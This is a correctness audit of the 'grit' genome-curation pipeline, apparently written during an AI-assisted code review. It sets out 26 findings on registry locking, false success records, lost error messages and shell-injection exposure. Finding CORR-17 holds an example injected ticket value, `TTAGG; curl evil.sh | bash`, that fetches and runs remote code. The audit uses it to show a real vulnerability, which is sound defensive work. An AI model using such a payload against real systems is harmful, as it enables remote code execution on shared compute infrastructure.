# Correctness & Error-Handling Assessment (Phase 1 — diagnosis only)

Repo: `/Users/dz11/github/grit` · branch `test_and_fix_steps` · ~9,500 LOC in `grit/`
Scope: `_run`/`_submit_bsub`/epilogue, `RunTracker`/`RegistryManager`, synchronous tracked
steps, error propagation, filesystem/glob assumptions, input validation.

## Summary

The pipeline's central safety claim — CLAUDE.md's "the tracker's *success* only ever
reflects verified on-disk state" — is **not true as implemented**. `grit _state-update`
writes `success` from the job's exit status alone; the output glob is best-effort and
its result is discarded when empty (`click_cli.py:228-251`). Several steps compound this:
`sex-matcher.sh` ends in an unconditional `exit 0`, `qv` records success the moment the
submitting wrapper returns, and `finalize_qc` logs a warning and continues when a
canonical FASTA is missing, then records success anyway. Each of these produces exactly
the failure the tool exists to prevent: a green status over an incomplete or wrong assembly.

The second systemic weakness is the registry. `~/.grit/grit_registry.json` is a
single JSON document rewritten wholesale on every state change, with **no locking, no
per-writer temp file, and a `_load()` that turns any read/parse failure into an empty
list**. Two epilogues firing at once, or one truncated file, silently discards every
ticket and every step record in the file — the "hours of manual work redone" outcome.

Third, error propagation is uniformly poor: `_run()` captures stderr and throws it away,
so a failing farm tool reaches the curator as `CalledProcessError ... exit status 1` plus
a Python traceback, with the tool's own diagnostic lost.

Counted: **7 critical, 9 major, 10 minor** (26 findings). The `--untracked` invariant that
CLAUDE.md documents as previously fixed **is** correctly upheld at every `finish()` call
site I traced (see "Verified as sound" below) — that one is genuinely fixed.

## Test suite status

```
$ uv run pytest tests/ -q
461 passed in 1.54s
```
Passes cleanly. Note that nothing in the suite exercises concurrent registry writes,
corrupt-registry recovery, bjobs-unavailable behaviour, or epilogue quoting — the areas
where the critical findings live.

## Findings

---

**CORR-01** | severity: critical | confidence: confirmed | `grit/core/registry.py:299-306`
| claim: `_load()` converts any unreadable or malformed registry into an empty list, and
the next `_save()` then overwrites the file with only the current ticket, destroying all
other tickets and their entire step history.
| failure scenario: the registry is truncated (crash mid-write, full quota, an interrupted
NFS write) or a transient `OSError` occurs on read. `_load()` logs `Registry: could not read
...` at WARNING and returns `[]`. The curator's next `grit setup -t RC-2000` calls
`add_ticket` → `tickets = []` → append one → `_save([one_ticket])`. Every other active
ticket's `workdir`, `status`, `steps[]` (all run dirs, job ids, recorded outputs, canonical
history) is gone permanently, with no backup and no error shown. All subsequent
`find_canonical_fa` calls fall back to filesystem globs.
| effort: S | blast radius: cross-module | debt quadrant: inadvertent-reckless
| open-source impact: blocker

---

**CORR-02** | severity: critical | confidence: confirmed | `grit/core/registry.py:161-169, 308-312`
| claim: every registry mutation is an unlocked read-modify-write of the whole file through
a **fixed, shared** temp path (`grit_registry.tmp`), so concurrent writers lose updates and
can install a corrupted file.
| failure scenario: two bsub epilogues finish within the same second on two compute nodes
(routine — `post-curation` submits hap1 and hap2 remapping together). Both run
`grit _state-update`; both `_load()` the same snapshot, both append their own finish record,
both `_save()`. The second `os.replace` wins: one job's `success` + `outputs` is silently
lost, that run stays `started` forever, and its outputs never enter canonical resolution.
Worse variant: both processes `write_text` to the *same* `grit_registry.tmp`; a shorter
write followed by a replace installs a truncated/interleaved JSON document — which
CORR-01 then converts into total history loss. `grep -rn "flock\|fcntl"` over `grit/`
returns nothing.
| effort: M | blast radius: cross-module | debt quadrant: inadvertent-reckless
| open-source impact: blocker

---

**CORR-03** | severity: critical | confidence: confirmed | `grit/core/click_cli.py:228-251`, `grit/utils/helpers.py:89-105`, `grit/scripts/sex-matcher.sh:49`
| claim: the epilogue records `success` purely from `$LSB_JOBEXIT_STAT`; the output glob is
optional and a *no outputs found* result is stored as `outputs=None` rather than
downgrading the status — so CLAUDE.md's "success only ever reflects verified on-disk state"
is false, and `sex-matcher.sh`'s trailing `exit 0` makes that step's success unconditional.
| failure scenario: `grit sex-matcher -t RC-1234` submits the 32-core/80 GB job. Inside
`sex-matcher.sh`, busco fails (OOM inside the singularity container); `mv .../full_table.tsv`
fails; `grep -f $sexFile` fails; the script still reaches `exit 0`. LSF sets
`LSB_JOBEXIT_STAT=0`, the epilogue runs `grit _state-update --status success`, and
`_get_step_specs("sex_matcher")` returns `[]` so no verification happens at all. `grit status`
shows sex_matcher **success**; `run_sex_matcher`'s guard (`sex_matcher.py:103-106`) sees
`status == "success"` and prints `Already done →` forever. No `Best_match*` file exists.
Only `grit untrack` recovers. The same shape applies to every step whose wrapper script
swallows its own failures.
| effort: M | blast radius: cross-module | debt quadrant: deliberate-reckless
| open-source impact: blocker

---

**CORR-04** | severity: critical | confidence: confirmed | `grit/utils/helpers.py:108-134`, `grit/core/registry.py:242-297`
| claim: `_check_bjobs` ignores the subprocess return code and pre-seeds every job id as
`"gone"`, so any bjobs failure reports *all* in-flight jobs as finished, and
`_resolve_gone_job` then marks a still-running job `success` if **any** output file has
appeared.
| failure scenario: LSF's `mbatchd` is briefly unresponsive (or `grit status` is run
somewhere `bjobs` isn't on PATH → exit 127, empty stdout, no exception). `refresh_statuses`
→ `_refresh_pending_jobs` sees status `gone` for a `rename_and_orient` job that is still
writing its FASTA. `_resolve_gone_job` calls `collect_outputs`, which globs
`{tol_id}.hap1.*.fa` and matches the **partially written** file, so
`tracker.finish(..., "success", outputs=...)` is recorded. That path is now the freshest
tracked output and `find_canonical_fa` returns it — `finalize-qc` copies a truncated
FASTA into the curated release directory. Note the merely-`log.debug` swallow at
`helpers.py:132` hides the underlying cause from the curator entirely.
| effort: M | blast radius: cross-module | debt quadrant: inadvertent-reckless
| open-source impact: blocker

---

**CORR-05** | severity: critical | confidence: confirmed | `grit/steps/post_curation/pretext_to_asm.py:117`
| claim: the curated AGP is chosen as `glob.glob(agp_pattern)[0]` — unsorted, i.e. raw
directory order — while every comparable site in the codebase uses `sorted(...)[-1]`.
| failure scenario: the workdir holds both `sDipInt39.pretext.agp_1` (this curation, just
scp'd) and `sDipInt39.agp` (left from a previous round; the default glob is
`{tol_id}*.agp*`, which matches both). `glob.glob` returns filesystem order, so grit may
feed the **stale** AGP to `pretext-to-asm`, produce a curated FASTA reflecting the wrong
curation, record it as `success` with outputs, and make it canonical. Nothing downstream
can detect this; the curator only finds out at QC, or not at all. Non-deterministic between
runs and between filesystems.
| effort: S | blast radius: module | debt quadrant: inadvertent-reckless
| open-source impact: friction

---

**CORR-06** | severity: critical | confidence: confirmed | `grit/steps/post_curation/finalize_qc.py:232-240, 250-268, 275-283, 320-327`
| claim: `finalize_qc` treats a missing canonical FASTA or chromosome list as a warning and
`continue`s, `touch`es an **empty** file when haplotigs are missing, and then unconditionally
records `success` — producing an incomplete release directory that grit reports as done.
| failure scenario: a dual-hap ticket where hap2's `pretext_to_asm` run was untracked or its
run dir was cleaned. `find_canonical_fa(ctx, "hap2")` raises `FileNotFoundError`; line 236
logs a warning and `continue`s, so `{tol_id}.hap2.1.primary.curated.fa` is **never copied**.
`find_canonical_haplotigs` likewise fails → line 268 `touch`es a 0-byte
`{tol_id}.hap2.1.all_haplotigs.curated.fa`. Line 320 then records
`finish("finalize_qc", ..., "success", outputs={"curated_dir": ...})`, `STEP_TO_STATUS`
moves the ticket to `post_processing`, and `grit status` shows green. The release directory
handed to submission is missing one haplotype and contains an empty haplotig file. There is
also no try/except here, so a `cp` failure mid-way strands the record as `started`.
| effort: M | blast radius: module | debt quadrant: deliberate-reckless
| open-source impact: blocker

---

**CORR-07** | severity: critical | confidence: confirmed | `grit/steps/post_curation/qv.py:80-96`
| claim: `run_qv` is a synchronous tracked step that records `success` unconditionally after
`_run()` returns and has **no** try/except, violating the rule CLAUDE.md states for exactly
this class of step.
| failure scenario: its own CLI help says "Submit QV and k-mer completeness analysis **via
bsub**" — `kmer_completeness.bash` submits its own farm jobs, so `_run` returns as soon as
submission succeeds. Line 93 then runs `_find_qv_outputs(ctx)`, finds no `{tol_id}.qv` yet
(the job hasn't started), gets `{}` → `outputs=None`, and line 94 records **success** with no
outputs. `STEP_TO_STATUS` flips the ticket to `ready_for_qc`. The curator proceeds to
`finalize-qc`, whose step 4 (`if not qv_dir.exists()`) may or may not re-trigger it. Separately,
if `_run` raises (module load failure, script missing), the `started` record is never finished —
no epilogue and no `job_id` means `grit status`'s bjobs recovery can never apply, so the
record is stranded permanently.
| effort: S | blast radius: module | debt quadrant: inadvertent-reckless
| open-source impact: friction

---

**CORR-08** | severity: major | confidence: confirmed | `grit/steps/post_curation/hic_remapping.py:70-84`
| claim: the "already done, skipping" branch finalises a run as `success` based on the mere
existence of an `hr.pretext` file, even while that run's nextflow pipeline is still writing it.
| failure scenario: `grit hic-remapping` was launched an hour ago; curationpretext submits its
own jobs internally so no `-Ep` epilogue exists (CLAUDE.md acknowledges this) and the record is
still `started`. The curator re-runs `grit hic-remapping -t RC-1234` to check on it.
`latest_run_dir` returns the in-flight run dir; the glob finds the pretext map nextflow is
mid-write on; the FASTA is not newer, so line 76-82 executes
`finish(step, prev_dir, "success", outputs=...)` and prints `Already done →`. The curator scp's
a truncated pretext map and curates against it. Also note the mtime comparison at line 53
uses `min(...)` over the pretext files against a single FASTA mtime — on Lustre, coarse
mtime granularity and client attribute caching make a same-second re-run compare equal and
take the "already done" branch.
| effort: M | blast radius: module | debt quadrant: inadvertent-prudent
| open-source impact: friction

---

**CORR-09** | severity: major | confidence: confirmed | `grit/steps/optional/busco_curated.py:153`, `grit/steps/optional/busco_synteny.py:119`, `grit/steps/optional/fastga_synteny.py:108`, `grit/steps/pre_curation/sex_matcher.py:158`
| claim: four steps call `_submit_bsub` **outside** any try/except after `tracker.start()`, so a
submission failure strands the record as `started` with no `job_id` and no recovery path —
unlike `fastga.py:151-158`, `rename_and_orient.py:113-120` and `pretext_to_asm.py:135-145`,
which do wrap it.
| failure scenario: LSF rejects the submission (bad `-G` accounting group, queue closed, user
over job limit). `_run` raises `CalledProcessError`; the `started` record written by
`tracker.start()` is never finished. `record_job` was never reached, so there is no `job_id`,
so `pending_jobs()` skips it and `grit status`'s bjobs recovery can never resolve it. The row
shows `running` forever, and `latest_run_dir` returns the empty run dir as a fallback to any
downstream consumer. Only `grit untrack` clears it.
| effort: S | blast radius: cross-module | debt quadrant: inadvertent-prudent
| open-source impact: friction

---

**CORR-10** | severity: major | confidence: confirmed | `grit/utils/helpers.py:872-905` (`_get_step_specs._MAP`), `grit/core/manifests.py:13-93`, `grit/core/registry.py:281-297`
| claim: `busco_curated`, `super_to_scaffold`, `post_processing`, `pretext_to_asm_recurate`
and `pretext_to_asm_recurate_hap2` are missing from `_get_step_specs._MAP` and/or
`STEP_MANIFESTS`, so both recovery paths give up on them — `_resolve_gone_job`'s comment
literally says *"other bsub steps: leave as-is until epilogue fix propagates"*.
| failure scenario: a `busco_curated` job is killed by the scheduler and its epilogue never
runs (see CORR-11's node-death case). `_resolve_gone_job` finds no specs and the step is not
`sex_matcher`, so it returns without finishing. In `show_ticket_history`,
`verify_outputs("busco_curated", ...)` returns `not_tracked` (no manifest), which is neither
`ok` nor `no_files`, so the row is displayed as `unknown (gone)` and the record stays
`started` permanently. Note the opposite hazard for `qv`/`validate_files`/`finalize_qc`, whose
manifests are `"files": []` → `verify_outputs` returns `no_files` → `status.py:544-551`
records **success purely on the strength of a `gone` bjobs reply**.
| effort: M | blast radius: cross-module | debt quadrant: deliberate-prudent
| open-source impact: friction

---

**CORR-11** | severity: major | confidence: confirmed | `grit/steps/post_curation/pretext_to_asm_recurate.py:163-172`
| claim: the guard that fails loudly on a missing recurate FASTA runs *after*
`_run_pretext_to_asm_core` has already written `finish(..., "success")`, leaving the tracker
recording success for a run the code itself has just declared invalid.
| failure scenario: `pretext-to-asm` exits 0 but the AGP produced no `{tol_id}.{hap}.*.curated.fa`
(wrong hap token in the AGP filename, say). `_run_pretext_to_asm_core` records
`success` with `outputs=None` (line 138-141 of `pretext_to_asm.py`). Control returns, line 166
finds no `{hap}_fa` output and raises; the CLI prints a traceback and exits 1. The registry now
holds `pretext_to_asm_recurate: success`. `grit status` shows the step green,
`STEP_TO_STATUS` advances the ticket, and `latest_run_dir` returns the empty run dir — the
exact "canonical silently falls back to pre-recuration output" state the error message warns
about, now with a success row on top of it.
| effort: S | blast radius: module | debt quadrant: inadvertent-prudent
| open-source impact: friction

---

**CORR-12** | severity: major | confidence: confirmed | `grit/utils/helpers.py:42-59`
| claim: `_run` with the default `capture=True` swallows the failing command's stderr —
`CalledProcessError`'s message contains only the command and exit code — so the curator
never sees the tool's own diagnostic.
| failure scenario: `grit finalize-qc` runs `cp {src} {dest}` where the destination filesystem
is full. `cp` writes `cp: error writing '...': No space left on device` to stderr, which is
captured into `result.stderr` and discarded when `check=True` raises. The command wrapper's
`except Exception: log.exception("finalize-qc failed")` prints a Python traceback ending in
`subprocess.CalledProcessError: Command '...' returned non-zero exit status 1`. The curator
has to re-run the command by hand to learn what went wrong. This applies to every one of the
~40 `_run(...)` sites that use the default capture mode.
| effort: S | blast radius: cross-module | debt quadrant: inadvertent-reckless
| open-source impact: blocker

---

**CORR-13** | severity: major | confidence: confirmed | `grit/steps/pre_curation/sex_matcher.py:106, 160`, `grit/core/manifests.py:20-23`, `grit/scripts/sex-matcher.sh:6`
| claim: three different locations are assumed for sex_matcher's output — the script writes to
`pwd` (= `run_dir`), but the resubmit guard globs `ctx.workdir` and `STEP_MANIFESTS` declares
`"dir": "workdir"`; only `_resolve_gone_job` globs the right place.
| failure scenario: a sex_matcher job completes correctly and writes `Best_match*` into its
`run_dir`, but the epilogue does not fire (node reboot). The curator re-runs `grit sex-matcher`.
Line 106 globs `ctx.workdir/Best_match*` → empty → the guard concludes the previous job
"produced no output", marks it `failed`, and **resubmits an 80 GB / 32-core busco job** whose
results already exist. Meanwhile `verify_outputs("sex_matcher")` also checks the workdir and
always returns `missing`, so `grit status`'s recovery can never confirm the step either.
| effort: S | blast radius: module | debt quadrant: inadvertent-prudent
| open-source impact: friction

---

**CORR-14** | severity: major | confidence: confirmed | `grit/core/context.py:263-277, 136-154`
| claim: `_detect_assembly_type` only recognises `hap1` and `primary`, though the dataclass
docstring, `is_single_hap()` and every `_PTA_ALIASES` map in `helpers.py` claim
`paternal`/`maternal` support; and every other required YAML key is read with a bare `[]`
subscript, so a malformed or partial Jira YAML surfaces as a raw `KeyError` traceback.
| failure scenario (a): a trio assembly whose YAML uses `paternal:`/`maternal:` keys →
`ValueError: Cannot detect assembly type from YAML keys: [...]` → the wrapper logs the
traceback and exits 1, for a case the rest of the code is written to handle
(`helpers.py:308-313`, `is_single_hap`). grit is simply unusable for that ticket, with no
message saying so. (b): a ticket whose YAML lacks `specimen` → `KeyError: 'specimen'` at
`context.py:136`, printed as a traceback with no mention of the ticket, the field, or Jira.
| effort: S | blast radius: cross-module | debt quadrant: inadvertent-prudent
| open-source impact: friction

---

**CORR-15** | severity: major | confidence: confirmed | `grit/core/registry.py:290-292` vs `grit/core/status.py:540-551`
| claim: a single `grit status -t RC-1234` applies two *different and contradictory*
verification policies to the same `gone` job, and the laxer one runs first and wins.
| failure scenario: `status_cmd` calls `registry.refresh_statuses()` before
`show_ticket_history`. `refresh_statuses` → `_refresh_pending_jobs` → `_resolve_gone_job`,
which marks the run `success` if `collect_outputs` returns **anything at all** (one of two
expected files is enough). By the time `show_ticket_history` applies its stricter
`verify_outputs(...) in ("ok", "no_files")` test, the record is no longer `started`, so the
strict test never runs. A `fastga` job that produced `*.idx` but died before writing the PAF
is recorded `success`; `fastga-stats` then fails with "No FastGA PAF file found" against a
step the status table shows as green.
| effort: M | blast radius: module | debt quadrant: inadvertent-reckless
| open-source impact: friction

---

**CORR-16** | severity: major | confidence: confirmed | `grit/core/context.py:146, 148`
| claim: two input-derivation bugs in one block — `read_type = "hifi" if pacbio_read_type else "hifi"`
is a no-op ternary that always yields `"hifi"`, and `ont_dir_raw.replace("fasta", "")`
substring-replaces anywhere in the path, not just a trailing component.
| failure scenario (a): any ticket whose long reads are PacBio CLR/other gets
`--read_type hifi` passed to curationpretext, which will map reads with the wrong preset —
silently producing a lower-quality Hi-C map the curator curates against. The dead branch
shows the check was intended and lost. (b): an ONT path such as
`/lustre/.../fastarchive/nBraTes1/ont/fasta` becomes `/lustre/.../rchive/nBraTes1/ont/`, and
`hic_remapping.py:105` then appends `/fasta` to a path that does not exist — the pipeline
fails with a nextflow "no such file" that names a path the curator never typed.
| effort: S | blast radius: cross-module | debt quadrant: inadvertent-reckless
| open-source impact: friction

---

**CORR-17** | severity: major | confidence: confirmed | `grit/steps/post_curation/hic_remapping.py:108`, `grit/steps/pre_curation/find_reference.py:196`, `grit/core/context.py:243-248`
| claim: values taken verbatim from Jira (the `customfield_11650` teloseq field, `species`) are
interpolated into shell strings executed with `shell=True`, giving command-injection exposure
from ticket content.
| failure scenario: `teloseq_raw` is free text on the Jira issue, wrapped as
`f"--teloseq {teloseq_raw}"` and appended **unquoted** to the curationpretext command line
(`hic_cmd += f" {ctx.teloseq}"`). A ticket whose telomere field contains
`TTAGG; curl evil.sh | bash` executes as the curator on the farm. `find_reference` is only
marginally better: `-s "{species_query}"` is double-quoted, so a species value containing
`$(...)` or a backtick still runs — `_clean_species_name` strips parentheses and truncates to
two words but does nothing about shell metacharacters. Realistic non-malicious variant: any
YAML-derived path containing a space silently splits into two arguments everywhere (including
the `-Ep` epilogue's `--workdir {workdir}`).
| effort: M | blast radius: cross-module | debt quadrant: inadvertent-reckless
| open-source impact: blocker

---

**CORR-18** | severity: minor | confidence: confirmed | `grit/utils/helpers.py:89-105`
| claim: the epilogue's robustness rests on two unguarded assumptions — `sys.argv[0]` naming
an executable that exists on the compute node, and `$LSB_JOBEXIT_STAT` being set.
| failure scenario (a): grit invoked as `python -m grit ...` makes `sys.argv[0]` a `.py` path;
the epilogue `-Ep '/path/__main__.py _state-update ...'` is not executable → LSF's post-exec
fails, no record is written, the run stays `started` forever, and the curator sees nothing
(post-exec failures are not surfaced in grit at all). Same outcome whenever the venv path is
not mounted on the exec host. (b): if `LSB_JOBEXIT_STAT` is unset, `[ -eq 0 ]` is a `test`
syntax error returning 2, so the `||` branch fires and a **successful** job is recorded as
`failed`. (c): node death or a hard `bkill -r` skips post-exec entirely → stranded `started`,
recoverable only via the bjobs paths critiqued in CORR-04/CORR-10.
| effort: M | blast radius: module | debt quadrant: deliberate-prudent
| open-source impact: friction

---

**CORR-19** | severity: minor | confidence: confirmed | `grit/core/run_tracker.py:176-196`
| claim: `latest_run_dir` picks `success_runs[-1]` by **append order in the registry**, not by
run timestamp, so out-of-order completions make an older run canonical.
| failure scenario: the curator submits `rename_and_orient` run A (large, slow) and then run B.
B's epilogue appends `success(B)`; A's appends `success(A)` later. `latest_run_dir` now returns
**A**, the older run. `find_canonical_fa` is mtime-based so the FASTA choice survives, but
`cleanup.py:67-72` keeps `_latest_run_dir` = A and **deletes B's run dir**, and `_step_output`'s
re-glob fallback re-globs A. Same root cause makes `pending_jobs`'s `latest[key]` map and
`hic_remapping.py:78`'s `history(step)[-1]` check reason about "the last record" rather than
"this run's record".
| effort: M | blast radius: cross-module | debt quadrant: inadvertent-prudent
| open-source impact: friction

---

**CORR-20** | severity: minor | confidence: confirmed | `grit/utils/result_parsers.py:180-259`
| claim: the curation-results summary swallows every parse error with `except Exception: pass`
and picks among multiple candidate files with an unsorted `[0]`, so the numbers the curator
pastes into the Jira submission text can be silently wrong or silently absent.
| failure scenario: a dual-hap ticket has two `pretext_to_asm` logs in the run dir.
`log_files[0]` (line 194) takes whichever `glob` happens to return first, so `grit status`
reports hap2's cuts/breaks/joins as the ticket's totals — non-deterministically. Separately, a
`chromosome.list.csv` with an unexpected column makes `parse_chromosome_list` raise; line
188-189 swallows it and the summary reports no allosomes at all, so the curator records "no sex
chromosomes" for a genome that has them.
| effort: S | blast radius: module | debt quadrant: deliberate-reckless
| open-source impact: friction

---

**CORR-21** | severity: minor | confidence: confirmed | `grit/steps/pre_curation/add_pretext_view_tracks.py:143, 92-97, 62`
| claim: the telomere track's awk program is mis-escaped, and all three track commands are
shell pipelines whose exit status is that of the *last* stage, so an upstream failure is
reported as success.
| failure scenario: the string passed to the shell is
`awk '{ print $1\"\t\"$2\"\t\"$3\"\t\"($3-$2) }'`; inside single quotes the backslashes are
literal, so awk receives `$1\"` and dies with a syntax error. The pipeline's status is
`PretextGraph`'s, which exits 0 on empty stdin, so `_run`'s `check=True` passes and grit
prints `✓ Telo track added.` having added nothing. The same masking applies to
`add_gap_track`, whose `python3 /nfs/users/nfs_d/dz11/hap_bedgraph.py` is a hard-coded personal
path that will simply not exist for any other user — again reported as success. Latent today:
these three commands are commented out in `click_cli.py:153-158`.
| effort: S | blast radius: file | debt quadrant: inadvertent-reckless
| open-source impact: friction

---

**CORR-22** | severity: minor | confidence: confirmed | `grit/utils/helpers.py:42-59`, `grit/core/status.py:544-551`
| claim: `_run` sets no `timeout`, and `grit status` — a command whose name promises
read-only behaviour — mutates the registry.
| failure scenario (a): `_run(hic_cmd)` runs curationpretext in the foreground with
`capture=True`; if the pipeline hangs on an NFS stall, the curator's terminal is blocked
indefinitely with no output at all (capture mode buffers everything), and Ctrl-C leaves the
`started` record unfinished because `KeyboardInterrupt` propagates through
`except Exception` handlers untouched. (b): a curator running `grit status` to look at a
ticket triggers `refresh_statuses` → `_refresh_pending_jobs` → `finish(...)` writes, plus
`status.py:551`'s success write and `refresh_statuses`' own `ticket["status"]` mutation —
so a diagnostic command changes canonical state and can lose a concurrent write (CORR-02).
| effort: M | blast radius: cross-module | debt quadrant: deliberate-reckless
| open-source impact: friction

---

**CORR-23** | severity: minor | confidence: confirmed | `grit/core/click_cli.py:329-345`
| claim: `grit retrack` promotes a run to `success` without checking that the run's recorded
outputs still exist, or that the run ever succeeded.
| failure scenario: a bsub run started with `--untracked` fails on the farm. Its epilogue
correctly records `status="untracked"` (with `outputs=None` since nothing was produced). The
curator later runs `grit retrack -t RC-1234 -s rename_and_orient`; line 344 writes
`finish(step, run_dir, "success", outputs=None)` unconditionally. `latest_run_dir` now returns
a failed, empty run dir as the step's canonical run, and `_step_output` re-globs it.
| effort: S | blast radius: module | debt quadrant: inadvertent-prudent
| open-source impact: none

---

**CORR-24** | severity: minor | confidence: plausible | `grit/core/cleanup.py:89-104` vs `grit/utils/helpers.py:401-424`
| claim: cleanup keeps the *latest run dir per step* while canonical resolution picks the
*freshest matching file across a pool of steps*, so cleanup can delete the directory holding a
currently-canonical file.
| failure scenario: `pretext_to_asm` run A produced both the FASTA and the haplotigs; a later
re-run B produced only the FASTA (the AGP had no haplotig scaffolds). `find_canonical_haplotigs`
still resolves to A's file via the mtime pool. `grit cleanup` on the done ticket keeps only B
and deletes A — taking the canonical haplotig FASTA with it. A subsequent `finalize-qc`
re-run then `touch`es an empty replacement (CORR-06). I could not fully confirm how often a
re-run legitimately produces a strict subset of the prior run's outputs; confirming needs a
real ticket history.
| effort: M | blast radius: cross-module | debt quadrant: inadvertent-prudent
| open-source impact: none

---

**CORR-25** | severity: minor | confidence: confirmed | `grit/utils/helpers.py:79-86`
| claim: when bsub's stdout does not contain `Job <`, `_submit_bsub` returns that stdout
verbatim and callers store it as a `job_id`.
| failure scenario: bsub emits a warning line to stdout instead of the usual banner (e.g. a
job-array or licence notice). `record_job` writes that text into the record's `job_id`.
`pending_jobs()` now yields a record with a truthy non-numeric `job_id`, `_check_bjobs`
passes it to `bjobs`, gets nothing back, defaults it to `"gone"`, and `_resolve_gone_job`
finalises a job that may still be pending (CORR-04's path, reached without any LSF outage).
| effort: S | blast radius: module | debt quadrant: inadvertent-prudent
| open-source impact: none

---

**CORR-26** | severity: minor | confidence: plausible | `grit/core/run_tracker.py:87-89`
| claim: run dirs are keyed to whole-second UTC timestamps with no uniqueness check, so two
runs of the same step started within the same second share a directory.
| failure scenario: a scripted or chained invocation starts the same step twice inside one
second (`create_dir=True` uses `exist_ok=True`, so no error). Two registry records point at
one run dir; `status`'s row-merging collapses them into a single row; two epilogues then write
finish records for the same `(step, run_dir)` and the second job's outputs overwrite the
first's. The `suffix=` parameter exists precisely to avoid this but is only passed by
`hic_remapping`. I could not construct a *user-facing* command sequence that triggers it
today, hence plausible rather than confirmed.
| effort: S | blast radius: module | debt quadrant: deliberate-prudent
| open-source impact: none

---

## Verified as sound (checked, no finding)

- **The `untracked` overwrite bug is genuinely fixed.** I traced every `finish()` call site.
  The ones that omit `untracked=` are `registry.py:277,292,296`, `status.py:551`,
  `sex_matcher.py:109,129`, `hic_remapping.py:82` and `click_cli.py:344` (retrack, intentional).
  Each of the non-retrack sites is gated on `status == "started"`, which an untracked run never
  holds — `start()` writes `"untracked"` and the epilogue passes the flag through. The
  invariant holds.
- **Epilogue quoting is correct today.** `bsub -Ep '<epilogue>' <opts> "<inner>"`: the epilogue
  is single-quoted so its `$(...)`/`$LSB_JOBEXIT_STAT` survive the local shell, and no inner
  double quote appears in any epilogue or `inner_cmd` I inspected. The known
  "extra double quotes break the outer quoting" bug class has **no live instance** in
  `grit/steps/` or `grit/core/`. The one mis-escaped command found (CORR-21) is a `_run` call,
  not a bsub submission.
- **`_save` is atomic at the syscall level** (`os.replace`), which is why CORR-02's damage
  requires the shared temp-file collision rather than a torn single write.
- **`_run` handles missing binaries correctly** — `shell=True` yields exit 127 and
  `check=True` raises; the problem is what happens to the message afterwards (CORR-12).

## Failure modes I could not rule out (need farm access)

1. **Does LSF actually run `-Ep` after a `TERM_MEMLIMIT` kill, and what is `LSB_JOBEXIT_STAT`
   then?** `status.py:562-570` parses `TERM_MEMLIMIT` out of the LSF log, implying the step is
   sometimes recorded `failed` — but I could not confirm whether that comes from the epilogue
   or only from the bjobs `EXIT` path. If post-exec is skipped on memlimit kills, every
   OOM-killed job depends entirely on the bjobs recovery critiqued in CORR-04/CORR-10.
2. **Post-exec failure visibility.** If `grit _state-update` itself fails on the node (missing
   PATH, unwritable `~/.grit`, NFS home not mounted), nothing in grit ever learns of it. Whether
   the site's `JOB_INCLUDE_POSTPROC` setting turns that into a job `EXIT` (which would then
   mark a *successful* job failed) needs `lsb.params` inspection.
3. **`~/.grit` on shared vs node-local home.** The whole epilogue design assumes compute nodes
   see the same `~/.grit/grit_registry.json`. If home is autofs/NFS with attribute caching,
   CORR-02's lost-update window is far wider than local-disk reasoning suggests.
4. **Lustre mtime granularity for the canonical-resolution comparisons.** `_latest_tracked_output`
   resolves ties by step order; how often real runs land on identical mtimes (and therefore pick
   by list position rather than recency) can only be measured on the real filesystem.
5. **Partially-written files matched by `collect_outputs` globs.** CORR-04 and CORR-08 both hinge
   on a glob matching a file that is open for writing. Whether the farm tools write in place or
   write-then-rename determines how often this actually bites; I could not determine that from
   the wrapper scripts alone.
6. **`bjobs` retention window (`CLEAN_PERIOD`).** How long a finished job stays visible sets how
   often the `gone` branch — the one with the weakest verification — is taken instead of `DONE`.
